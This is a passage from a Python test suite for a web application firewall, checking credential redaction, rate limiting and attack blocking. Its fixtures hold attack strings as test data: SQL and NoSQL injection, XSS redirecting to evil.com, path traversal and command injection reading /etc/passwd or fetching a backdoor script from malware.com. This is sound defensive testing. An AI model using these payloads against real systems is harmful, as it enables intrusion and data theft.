        - redis://user:pass@redis.example.com:6379/0
        """
        
        filtered, has_sensitive = self.response_filter.filter_response(response_with_db_urls)
        assert has_sensitive is True
        assert "mongodb://admin:password123@" not in filtered
        assert "postgres://user:secret@" not in filtered
        assert "mysql://root:password@" not in filtered
        assert "redis://user:pass@" not in filtered
        assert "[REDACTED]" in filtered
    
    def test_filter_response_private_keys(self):
        """Test filtering response with private keys"""
        response_with_private_key = """
        -----BEGIN RSA PRIVATE KEY-----
        MIIEpAIBAAKCAQEA2bX...rest of key content...
        -----END RSA PRIVATE KEY-----
        
        Also found:
        -----BEGIN EC PRIVATE KEY-----
        MHcCAQEEIB...key content...
        -----END EC PRIVATE KEY-----
        """
        
        filtered, has_sensitive = self.response_filter.filter_response(response_with_private_key)
        assert has_sensitive is True
        assert "-----BEGIN RSA PRIVATE KEY-----" not in filtered
        assert "-----BEGIN EC PRIVATE KEY-----" not in filtered
        assert "[REDACTED]" in filtered
    
    def test_filter_response_aws_credentials(self):
        """Test filtering response with AWS credentials"""
        response_with_aws = """
        AWS Configuration:
        Access Key: AKIAIOSFODNN7EXAMPLE
        Secret Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
        """
        
        filtered, has_sensitive = self.response_filter.filter_response(response_with_aws)
        assert has_sensitive is True
        assert "AKIAIOSFODNN7EXAMPLE" not in filtered
        assert "[REDACTED]" in filtered
    
    def test_filter_response_jwt_tokens(self):
        """Test filtering response with JWT tokens"""
        response_with_jwt = """
        {
            "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            "refresh_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiaWF0IjoxNTE2MjM5MDIyfQ.KKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        }
        """
        
        filtered, has_sensitive = self.response_filter.filter_response(response_with_jwt)
        assert has_sensitive is True
        assert "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" not in filtered
        assert "[REDACTED]" in filtered
    
    def test_filter_response_multiple_sensitive_items(self):
        """Test filtering response with multiple types of sensitive data"""
        response_with_multiple = """
        {
            "api_key": "sk-test123",
            "database": "mongodb://user:pass@localhost:27017/db",
            "aws_key": "AKIAIOSFODNN7EXAMPLE",
            "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abc123",
            "normal_data": "This should remain"
        }
        """
        
        filtered, has_sensitive = self.response_filter.filter_response(response_with_multiple)
        assert has_sensitive is True
        
        # Check that sensitive data is redacted
        assert "sk-test123" not in filtered
        assert "mongodb://user:pass@" not in filtered
        assert "AKIAIOSFODNN7EXAMPLE" not in filtered
        assert "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" not in filtered
        
        # Check that normal data remains
        assert "This should remain" in filtered
        assert "[REDACTED]" in filtered
    
    def test_filter_response_case_insensitive(self):
        """Test case-insensitive filtering"""
        response_mixed_case = """
        {
            "API_KEY": "sk-test123",
            "Api_Secret": "secret_abc123",
            "normal_field": "normal_value"
        }
        """
        
        filtered, has_sensitive = self.response_filter.filter_response(response_mixed_case)
        assert has_sensitive is True
        assert "sk-test123" not in filtered
        assert "secret_abc123" not in filtered
        assert "[REDACTED]" in filtered
        assert "normal_value" in filtered
    
    def test_filter_response_logging(self):
        """Test that filtering logs when sensitive data is found"""
        response_with_sensitive = """
        {
            "api_key": "sk-test123"
        }
        """
        
        with patch('src.security.waf.logger') as mock_logger:
            filtered, has_sensitive = self.response_filter.filter_response(response_with_sensitive)
            
            assert has_sensitive is True
            mock_logger.warning.assert_called_once()
            warning_call = mock_logger.warning.call_args[0][0]
            assert "Sensitive data detected and redacted" in warning_call


class TestWAFIntegration:
    """Integration tests for WAF components"""
    
    def setup_method(self):
        """Setup integration test fixtures"""
        self.waf_config = WAFConfig()
        self.waf_filter = WAFFilter(config=self.waf_config)
        self.rate_limiter = WAFRateLimiter()
        self.waf_logger = WAFLogger()
        self.response_filter = WAFResponseFilter()
    
    def test_end_to_end_request_processing(self):
        """Test complete request processing workflow"""
        client_id = "test_client"
        client_ip = "192.168.1.100"
        
        # 1. Check rate limit
        rate_result = self.rate_limiter.check_rate_limit(client_id)
        assert rate_result.allowed is True
        
        # 2. Check WAF rules
        malicious_request = {
            "query": "SELECT * FROM users WHERE id = 1; DROP TABLE users;",
            "client_ip": client_ip
        }
        
        waf_result = self.waf_filter.check_request(malicious_request)
        assert waf_result.blocked is True
        assert waf_result.rule == "sql_injection"
        
        # 3. Log the blocked request
        self.waf_logger.log_blocked_request(
            client_ip=client_ip,
            rule_name=waf_result.rule,
            severity=waf_result.severity,
            request_data=malicious_request
        )
        
        # Verify logging
        events = self.waf_logger.get_recent_events()
        assert len(events) == 1
        assert events[0]["client_ip"] == client_ip
        assert events[0]["rule_name"] == "sql_injection"
    
    def test_rate_limiting_integration(self):
        """Test rate limiting integration with logging"""
        client_id = "rate_test_client"
        
        # Make requests up to the limit
        for i in range(60):
            result = self.rate_limiter.check_rate_limit(client_id)
            assert result.allowed is True
        
        # Exceed the limit
        result = self.rate_limiter.check_rate_limit(client_id)
        assert result.allowed is False
        
        # Log the rate limit event
        self.waf_logger.log_rate_limit(
            client_id=client_id,
            requests_count=61,
            limit=60
        )
        
        # Verify rate limit logging
        events = self.waf_logger.get_recent_events(event_type="rate_limit_exceeded")
        assert len(events) == 1
        assert events[0]["client_id"] == client_id
        assert events[0]["requests_count"] == 61
    
    def test_multi_layer_protection(self):
        """Test multi-layer protection scenario"""
        # Scenario: Attacker tries multiple attack vectors
        attacker_ip = "10.0.0.1"
        attacker_id = "attacker_001"
        
        attack_requests = [
            {"payload": "SELECT * FROM users; DROP TABLE users;"},
            {"script": "<script>alert('XSS')</script>"},
            {"file": "../../../etc/passwd"},
            {"cmd": "test.txt; cat /etc/passwd"},
            {"nosql": '{"username": {"$ne": null}}'}
        ]
        
        blocked_count = 0
        
        for i, request in enumerate(attack_requests):
            # Check rate limit first
            rate_result = self.rate_limiter.check_rate_limit(attacker_id)
            if not rate_result.allowed:
                self.waf_logger.log_rate_limit(attacker_id, i + 1, 60)
                continue
            
            # Check WAF rules
            waf_result = self.waf_filter.check_request(request)
            if waf_result.blocked:
                blocked_count += 1
                self.waf_logger.log_blocked_request(
                    client_ip=attacker_ip,
                    rule_name=waf_result.rule,
                    severity=waf_result.severity,
                    request_data=request
                )
        
        # All attack requests should be blocked
        assert blocked_count == len(attack_requests)
        
        # Verify comprehensive logging
        blocked_events = self.waf_logger.get_recent_events(event_type="request_blocked")
        assert len(blocked_events) == len(attack_requests)
    
    def test_response_filtering_integration(self):
        """Test response filtering in complete workflow"""
        # Simulate response that might contain sensitive data
        api_response = """
        {
            "status": "success",
            "data": {
                "users": [{"name": "John", "api_key": "sk-secret123"}]
            },
            "database_url": "mongodb://admin:pass@localhost:27017/db"
        }
        """
        
        # Filter the response
        filtered_response, has_sensitive = self.response_filter.filter_response(api_response)
        
        assert has_sensitive is True
        assert "sk-secret123" not in filtered_response
        assert "mongodb://admin:pass@" not in filtered_response
        assert "[REDACTED]" in filtered_response
        assert "John" in filtered_response  # Non-sensitive data preserved
    
    def test_comprehensive_security_scenario(self):
        """Test comprehensive security scenario with all components"""
        # Setup scenario: High-traffic application under attack
        legitimate_client = "legitimate_user"
        attacker_client = "attacker_bot"
        
        # Legitimate user makes normal requests
        for i in range(10):
            rate_result = self.rate_limiter.check_rate_limit(legitimate_client)
            assert rate_result.allowed is True
            
            benign_request = {"search": "python tutorials", "page": i + 1}
            waf_result = self.waf_filter.check_request(benign_request)
            assert waf_result.blocked is False
        
        # Attacker tries various attacks rapidly
        attack_patterns = [
            {"query": "'; DROP TABLE users; --"},
            {"script": "<script>document.location='http://evil.com'</script>"},
            {"path": "../../../../etc/passwd"},
            {"cmd": "file.txt; wget http://malware.com/backdoor.sh"},
            {"injection": '{"$where": "this.password"}'}
        ]
        
        attacks_blocked = 0
        for attack in attack_patterns:
            # Rapid requests - should hit rate limit eventually
            rate_result = self.rate_limiter.check_rate_limit(attacker_client)
            
            if rate_result.allowed:
                # Check WAF if rate limit allows
                waf_result = self.waf_filter.check_request(attack)
                if waf_result.blocked:
                    attacks_blocked += 1
                    self.waf_logger.log_blocked_request(
                        client_ip="10.0.0.1",
                        rule_name=waf_result.rule,
                        severity=waf_result.severity,
                        request_data=attack
                    )
            else:
                # Rate limited
                self.waf_logger.log_rate_limit(attacker_client, 100, 60)
        
        # Verify protection effectiveness
        assert attacks_blocked > 0  # Some attacks should be blocked by WAF
        
        # Check that legitimate user is unaffected
        rate_result = self.rate_limiter.check_rate_limit(legitimate_client)
        assert rate_result.allowed is True  # Should still be within limits
        
        # Verify comprehensive audit trail
        all_events = self.waf_logger.get_recent_events()
        assert len(all_events) > 0
        
        # Should have both blocked requests and potentially rate limit events
        event_types = {event["event_type"] for event in all_events}
        assert "request_blocked" in event_types